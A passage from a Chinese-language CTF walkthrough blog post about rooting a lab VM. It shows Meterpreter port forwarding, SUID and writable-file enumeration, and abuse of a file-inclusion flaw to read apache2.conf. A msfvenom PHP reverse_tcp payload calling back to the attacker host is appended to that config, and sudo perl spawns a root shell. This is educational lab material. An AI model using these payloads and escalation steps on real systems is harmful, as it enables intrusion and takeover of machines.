+0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>枚举本地开发端口</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell </span><br><span class="line">Process 61 created.</span><br><span class="line">Channel 75 created.</span><br><span class="line">netstat -antp</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 127.0.0.1:8081          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 0.0.0.0:65534           0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::8080                 :::*                    LISTEN      572/java            </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::65534                :::*                    LISTEN      -                   </span><br><span class="line">tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      572/java            </span><br><span class="line">tcp6       0      0 :::8009                 :::*                    LISTEN      572/java            </span><br><span class="line">tcp6       0      0 192.168.116.140:50706   192.168.116.1:4444      ESTABLISHED 685/java</span><br></pre></td></tr></table></figure>
<ul>
<li>这里发现目标主机上监听着8081端口，只能在目标本地进行访问，所以我们可以把端口转发出来，MSF里有自带的。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd /?</span><br><span class="line">Usage: portfwd [-h] [add | delete | list | flush] [args]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -L &lt;opt&gt;  Forward: <span class="built_in">local</span> host to listen on (optional). Reverse: <span class="built_in">local</span> host to connect to.</span><br><span class="line">    -R        Indicates a reverse port forward.</span><br><span class="line">    -h        Help banner.</span><br><span class="line">    -i &lt;opt&gt;  Index of the port forward entry to interact with (see the <span class="string">"list"</span> <span class="built_in">command</span>).</span><br><span class="line">    -l &lt;opt&gt;  Forward: <span class="built_in">local</span> port to listen on. Reverse: <span class="built_in">local</span> port to connect to.</span><br><span class="line">    -p &lt;opt&gt;  Forward: remote port to connect to. Reverse: remote port to listen on.</span><br><span class="line">    -r &lt;opt&gt;  Forward: remote host to connect to.</span><br><span class="line">meterpreter &gt; portfwd add -l 8081 -p 8081 -r 127.0.0.1</span><br><span class="line">[*] Local TCP relay created: :8081 &lt;-&gt; 127.0.0.1:8081</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>现在访问自己的8081端口就可以拿到第四个flag。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl http://127.0.0.1:8081                                        </span><br><span class="line">Black Panther Armour:&#123;690B4BAC6CA9FB81814128A294470F92&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>或者直接在目标主机访问</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">tomcat@ubuntu:~$ <span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">tomcat@ubuntu:/tmp$ wget http://127.0.0.1:8081</span><br><span class="line">wget http://127.0.0.1:8081</span><br><span class="line">--2019-10-10 04:46:42--  http://127.0.0.1:8081/</span><br><span class="line">Connecting to 127.0.0.1:8081... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 56 [text/html]</span><br><span class="line">Saving to: ‘index.html’</span><br><span class="line"></span><br><span class="line">index.html          100%[===================&gt;]      56  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2019-10-10 04:46:42 (2.79 MB/s) - ‘index.html’ saved [56/56]</span><br><span class="line"></span><br><span class="line">tomcat@ubuntu:/tmp$ cat index.html</span><br><span class="line">cat index.html</span><br><span class="line">Black Panther Armour:&#123;690B4BAC6CA9FB81814128A294470F92&#125;</span><br><span class="line">tomcat@ubuntu:/tmp$</span><br></pre></td></tr></table></figure>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><ul>
<li>查找GUID文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tomcat@ubuntu:/$ find / -perm -g=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -g=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/sbin/pam_extrausers_chkpwd</span><br><span class="line">/sbin/unix_chkpwd</span><br><span class="line">/usr/bin/crontab</span><br><span class="line">/usr/bin/expiry</span><br><span class="line">/usr/bin/chage</span><br><span class="line">/usr/bin/ssh-agent</span><br><span class="line">/usr/bin/wall</span><br><span class="line">/usr/bin/bsd-write</span><br><span class="line">/usr/bin/mlocate</span><br><span class="line">tomcat@ubuntu:/$</span><br></pre></td></tr></table></figure>
<ul>
<li>查找SUID文件</li>
</ul>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">tomcat@<span class="symbol">ubuntu:</span>/$ find / -perm -u=s -<span class="keyword">type</span> f <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line">find / -perm -u=s -<span class="keyword">type</span> f <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/fusermount</span><br><span class="line">/usr/bin/vmware-user-suid-wrapper</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">dbus</span>-1.0/<span class="title">dbus</span>-<span class="title">daemon</span>-<span class="title">launch</span>-<span class="title">helper</span></span></span><br><span class="line">/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">openssh</span>/<span class="title">ssh</span>-<span class="title">keysign</span></span></span><br><span class="line">/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">eject</span>/<span class="title">dmcrypt</span>-<span class="title">get</span>-<span class="title">device</span></span></span><br><span class="line">tomcat@<span class="symbol">ubuntu:</span>/$ </span><br><span class="line">tomcat@<span class="symbol">ubuntu:</span>/$ find / -perm -<span class="number">4000</span> <span class="number">2</span>&gt;dev/null | xargs ls -la</span><br><span class="line">find / -perm -<span class="number">4000</span> <span class="number">2</span>&gt;dev/null | xargs ls -la</span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root        <span class="number">30800</span> Aug <span class="number">11</span>  <span class="number">2016</span> /bin/fusermount</span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root        <span class="number">43088</span> Oct <span class="number">15</span>  <span class="number">2018</span> /bin/mount</span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root        <span class="number">64424</span> Jun <span class="number">28</span> <span class="number">0</span>4:<span class="number">0</span>5 /bin/ping</span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root        <span class="number">44664</span> Mar <span class="number">22</span>  <span class="number">2019</span> /bin/su</span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root        <span class="number">26696</span> Oct <span class="number">15</span>  <span class="number">2018</span> /bin/umount</span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root        <span class="number">76496</span> Mar <span class="number">22</span>  <span class="number">2019</span> /usr/bin/chfn</span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root        <span class="number">44528</span> Mar <span class="number">22</span>  <span class="number">2019</span> /usr/bin/chsh</span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root        <span class="number">75824</span> Mar <span class="number">22</span>  <span class="number">2019</span> /usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root        <span class="number">40344</span> Mar <span class="number">22</span>  <span class="number">2019</span> /usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root        <span class="number">59640</span> Mar <span class="number">22</span>  <span class="number">2019</span> /usr/bin/passwd</span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root       <span class="number">149080</span> Jan <span class="number">17</span>  <span class="number">2018</span> /usr/bin/sudo</span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root        <span class="number">18448</span> Jun <span class="number">28</span> <span class="number">0</span>4:<span class="number">0</span>5 /usr/bin/traceroute6.iputils</span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root        <span class="number">10312</span> May <span class="number">14</span> <span class="number">0</span>0:<span class="number">0</span>7 /usr/bin/vmware-user-suid-wrapper</span><br><span class="line">-rwsr-xr-- <span class="number">1</span> root messagebus  <span class="number">42992</span> Jun <span class="number">10</span> <span class="number">11</span>:<span class="number">0</span>5 /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">dbus</span>-1.0/<span class="title">dbus</span>-<span class="title">daemon</span>-<span class="title">launch</span>-<span class="title">helper</span></span></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root        <span class="number">10232</span> Mar <span class="number">27</span>  <span class="number">2017</span> /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">eject</span>/<span class="title">dmcrypt</span>-<span class="title">get</span>-<span class="title">device</span></span></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root       <span class="number">436552</span> Mar  <span class="number">4</span>  <span class="number">2019</span> /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">openssh</span>/<span class="title">ssh</span>-<span class="title">keysign</span></span></span><br><span class="line">tomcat@<span class="symbol">ubuntu:</span>/$</span><br></pre></td></tr></table></figure>
<ul>
<li>查找可写目录，发现有/var/www/html</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tomcat@ubuntu:/$ find / -writable -<span class="built_in">type</span> d 2&gt;/dev/null</span><br><span class="line">find / -writable -<span class="built_in">type</span> d 2&gt;/dev/null</span><br><span class="line">/dev/mqueue</span><br><span class="line">/dev/shm</span><br><span class="line">/tftpboot</span><br><span class="line">/var/lib/php/sessions</span><br><span class="line">/var/www/html</span><br><span class="line">/var/tmp</span><br><span class="line">/proc/902/task/902/fd</span><br><span class="line">/proc/902/fd</span><br><span class="line">/proc/902/map_files</span><br><span class="line">/tmp</span><br></pre></td></tr></table></figure>
<ul>
<li>查找root用户权限可写文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tomcat@ubuntu:/$ find / -writable -<span class="built_in">type</span> f 2&gt;/dev/null | grep -v <span class="string">"/proc/"</span> |xargs ls -al |grep root</span><br><span class="line">&lt;ev/null | grep -v <span class="string">"/proc/"</span> |xargs ls -al |grep root</span><br><span class="line">-rwxrwxrwx 1 root   root     7224 Sep 21 11:30 /etc/apache2/apache2.conf</span><br><span class="line">-rwxrwxrwx 1 root   tomcat   2262 Sep 21 21:15 /opt/tomcat/conf/tomcat-users.xml</span><br><span class="line">--w--w--w- 1 root   root        0 Oct 10 02:00 /sys/fs/cgroup/memory/cgroup.event_control</span><br><span class="line">-rw-rw-rw- 1 root   root        0 Oct 10 01:09 /sys/kernel/security/apparmor/.access</span><br><span class="line">-rw-rw-rw- 1 root   root        0 Oct 10 01:09 /sys/kernel/security/apparmor/.load</span><br><span class="line">-rw-rw-rw- 1 root   root        0 Oct 10 01:09 /sys/kernel/security/apparmor/.remove</span><br><span class="line">-rw-rw-rw- 1 root   root        0 Oct 10 01:09 /sys/kernel/security/apparmor/.replace</span><br><span class="line">tomcat@ubuntu:/$</span><br></pre></td></tr></table></figure>
<ul>
<li>找到<code>/etc/apache2/apache2.conf</code>和<code>/opt/tomcat/conf/tomcat-users.xml</code>文件可写。</li>
<li><p><code>/opt/tomcat/conf/tomcat-users.xml</code>只有之前的账号密码，只能看<code>/etc/apache2/apache2.conf</code>文件了。</p>
</li>
<li><p>查找passwd文件，每行记录又被冒号(:)分隔为7个字段分别对应：用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell</p>
</li>
<li>group文件对应：组名:口令:组标识号:组内用户列表</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">tomcat@ubuntu:/$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">armour:x:1000:1000:armour,,,:/home/armour:/bin/bash</span><br><span class="line">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">tomcat:x:1001:1001::/opt/tomcat:/bin/<span class="literal">false</span></span><br><span class="line">aarti:x:1002:1002:,,,:/home/aarti:/bin/bash</span><br><span class="line">tomcat@ubuntu:/$ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tomcat@ubuntu:~$ cat /etc/group</span><br><span class="line">cat /etc/group</span><br><span class="line">root:x:0:</span><br><span class="line">daemon:x:1:</span><br><span class="line">bin:x:2:</span><br><span class="line">sys:x:3:</span><br><span class="line">adm:x:4:syslog,armour</span><br><span class="line">tty:x:5:</span><br><span class="line">disk:x:6:</span><br><span class="line">lp:x:7:</span><br><span class="line">mail:x:8:</span><br><span class="line">news:x:9:</span><br><span class="line">uucp:x:10:</span><br><span class="line">man:x:12:</span><br><span class="line">proxy:x:13:</span><br><span class="line">kmem:x:15:</span><br><span class="line">dialout:x:20:</span><br><span class="line">fax:x:21:</span><br><span class="line">voice:x:22:</span><br><span class="line">cdrom:x:24:armour</span><br><span class="line">floppy:x:25:</span><br><span class="line">tape:x:26:</span><br><span class="line">sudo:x:27:armour</span><br><span class="line">audio:x:29:</span><br><span class="line">dip:x:30:armour</span><br><span class="line">www-data:x:33:</span><br><span class="line">backup:x:34:</span><br><span class="line">operator:x:37:</span><br><span class="line">list:x:38:</span><br><span class="line">irc:x:39:</span><br><span class="line">src:x:40:</span><br><span class="line">gnats:x:41:</span><br><span class="line">shadow:x:42:</span><br><span class="line">utmp:x:43:</span><br><span class="line">video:x:44:</span><br><span class="line">sasl:x:45:</span><br><span class="line">plugdev:x:46:armour</span><br><span class="line">staff:x:50:</span><br><span class="line">games:x:60:</span><br><span class="line">users:x:100:</span><br><span class="line">nogroup:x:65534:</span><br><span class="line">systemd-journal:x:101:</span><br><span class="line">systemd-network:x:102:</span><br><span class="line">systemd-resolve:x:103:</span><br><span class="line">input:x:104:</span><br><span class="line">crontab:x:105:</span><br><span class="line">syslog:x:106:</span><br><span class="line">messagebus:x:107:</span><br><span class="line">mlocate:x:108:</span><br><span class="line">uuidd:x:109:</span><br><span class="line">ssh:x:110:</span><br><span class="line">armour:x:1000:</span><br><span class="line">lpadmin:x:111:armour</span><br><span class="line">sambashare:x:112:armour</span><br><span class="line">ssl-cert:x:113:</span><br><span class="line">tomcat:x:1001:</span><br><span class="line">aarti:x:1002:</span><br><span class="line">tomcat@ubuntu:~$</span><br></pre></td></tr></table></figure>
<ul>
<li>找到一个普通用户aarti和armour</li>
<li>把Apache配置文件下载到自己的电脑，Apache默认以www-data用户启动的</li>
</ul>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">116.140</span><span class="regexp">/file.php?file=/</span>etc<span class="regexp">/apache2/</span>apache2.conf</span><br></pre></td></tr></table></figure>
<ul>
<li><p>修改用户和组，让Apache以上面那个普通用户启动，为什么不能以Root用户启动能？因为不重新编译是不能用Root权限的，这样Web服务也起不来。所以只能改aarti的</p>
</li>
<li><p>覆盖Apache配置文件</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">tomcat@ubuntu:/etc/apache2$ wget http://192.168.116.1:8000/apache2.conf -O apache2.conf</span><br><span class="line">&lt;p://192.168.116.1:8000/apache2.conf -O apache2.conf</span><br><span class="line">--2019-10-10 04:52:49--  http://192.168.116.1:8000/apache2.conf</span><br><span class="line">Connecting to 192.168.116.1:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 7195 (7.0K) [text/plain]</span><br><span class="line">Saving to: ‘apache2.conf’</span><br><span class="line"></span><br><span class="line">apache2.conf        100%[===================&gt;]   7.03K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">utime(apache2.conf): Operation not permitted</span><br><span class="line">2019-10-10 04:52:49 (243 MB/s) - ‘apache2.conf’ saved [7195/7195]</span><br><span class="line"></span><br><span class="line">tomcat@ubuntu:/etc/apache2$ cat apache2.conf</span><br></pre></td></tr></table></figure>
<ul>
<li>写入后到80端口服务下的目录写木马。(这是官方出题人写的)，我试了不对，创建文件的用户为Tomcat，aarti用户读不了这个文件，所以是访问不了的，服务端报500错误。</li>
<li>后来我利用文件包含Apache的配置文件获取到了会话。</li>
<li>就是把Shell写进Apache2.conf，再利用上面发现的文件包含漏洞。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.116.1 LPORT=2333 -o shell.php</span><br><span class="line">➜  ~ cat shell.php &gt;&gt; apache2.conf </span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; run </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.116.1:2333 </span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.116.140</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.116.1:2333 -&gt; 192.168.116.140:48606) at 2019-10-10 13:22:53 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: aarti (1002)</span><br><span class="line">meterpreter &gt; shell </span><br><span class="line">Process 12388 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">python3.6 -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br><span class="line">aarti@ubuntu:/var/www/html$ whoami</span><br><span class="line">whoami</span><br><span class="line">aarti</span><br><span class="line">aarti@ubuntu:/var/www/html$</span><br></pre></td></tr></table></figure>
<h2 id="提Root权限"><a href="#提Root权限" class="headerlink" title="提Root权限"></a>提Root权限</h2><ul>
<li>列举无密码sudo，发现有一个perl</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">aarti@ubuntu:/var/www/html$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> aarti on ubuntu:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User aarti may run the following commands on ubuntu:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/perl</span><br><span class="line">aarti@ubuntu:/var/www/html$ </span><br><span class="line">aarti@ubuntu:/var/www/html$ sudo perl -e <span class="string">'exec "/bin/bash";'</span></span><br><span class="line">sudo perl -e <span class="string">'exec "/bin/bash";'</span></span><br><span class="line">root@ubuntu:/var/www/html<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@ubuntu:/var/www/html<span class="comment"># </span></span><br><span class="line">root@ubuntu:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">final.txt</span><br><span class="line">root@ubuntu:~<span class="comment"># cat final.txt</span></span><br><span class="line">cat final.txt</span><br><span class="line"></span><br><span class="line">         ______   ______    _____   _     _  ______  </span><br><span class="line">   /\   (_____ \ |  ___ \  / ___ \ | |   | |(_____ \ </span><br><span class="line">  /  \   _____) )| | _ | || |   | || |   | | _____) )</span><br><span class="line"> / /\ \ (_____ ( | || || || |   | || |   | |(_____ ( </span><br><span class="line">| |__| |      | || || || || |___| || |___| |      | |</span><br><span class="line">|______|      |_||_||_||_| \_____/  \______|      |_|</span><br><span class="line">                                                     </span><br><span class="line"></span><br><span class="line">    IronMan Armour:&#123;3AE9D8799D1BB5E201E5704293BB54EF&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">!! Congrats you have finished this task !!</span><br><span class="line">							</span><br><span class="line">Contact us here:</span><br><span class="line">								</span><br><span class="line">Hacking Articles : https://twitter.com/rajchandel/</span><br><span class="line">		</span><br><span class="line">AArti Singh: https://www.linkedin.com/<span class="keyword">in</span>/aarti-singh-353698114/</span><br><span class="line">	</span><br><span class="line">+-+-+-+-+-+ +-+-+-+-+-+-+-+</span><br><span class="line"> |E|n|j|o|y| |H|A|C|K|I|N|G|</span><br><span class="line"> +-+-+-+-+-+ +-+-+-+-+-+-+-+	</span><br><span class="line">root@ubuntu:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
